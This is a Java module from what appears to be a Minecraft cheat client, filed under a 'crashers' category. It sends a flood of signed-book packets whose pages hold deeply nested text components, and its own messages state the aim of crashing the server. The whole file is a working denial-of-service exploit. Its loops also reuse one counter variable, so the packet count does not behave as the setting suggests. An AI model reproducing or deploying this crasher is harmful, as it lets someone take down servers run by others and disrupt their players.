package it.thatskai.aragosta.module.crasher;

import io.netty.buffer.Unpooled;
import it.thatskai.aragosta.AragostaMain;
import it.thatskai.aragosta.annotations.modules.IModule;
import it.thatskai.aragosta.annotations.modules.Module;
import it.thatskai.aragosta.module.Category;
import it.thatskai.aragosta.settings.Setting;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

import static it.thatskai.aragosta.utils.MessageUtils.sendMessage;

@IModule(
        name = "Payload-BSign",
        key = 0,
        category = Category.CRASHERS
)
public class Payload2Module extends Module {

    public void setup() {
        AragostaMain.instance.settingsManager.rSetting(new Setting(getName(), this, 430, 40, 1000, true));
    }

    public void onEnable() {
        int packets = (int) AragostaMain.instance.settingsManager.getSettingByName(getName()).getValDouble();
        sendMessage("Mandando " + packets + " pacchetti con il metodo "+getName(), true);
        for (int i = 0; i < packets; ++i) {
            NBTTagCompound comp = new NBTTagCompound();
            NBTTagList list = new NBTTagList();
            String value = "";
            value = value + "{";
            //int bvalue = pages;
            for (i = 0; i < 50; ++i) {
                value = value + "extra:[{";
            }
            for (i = 0; i < 50; ++i) {
                value = value + "text:L}],";
            }
            value = value + "text:L}";
            list.appendTag(new NBTTagString(value));
            comp.setString("author", "dfsg");
            comp.setString("title", "sdgsdg");
            comp.setByte("resolved", (byte) 1);
            comp.setTag("pages", list);
            ItemStack book = new ItemStack(Items.writable_book);
            book.setTagCompound(comp);
            PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
            pb.writeItemStackToBuffer(book);
            Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|BSign", pb));
        }
        sendMessage("&7Crashing..", false);
        toggle();
    }
}
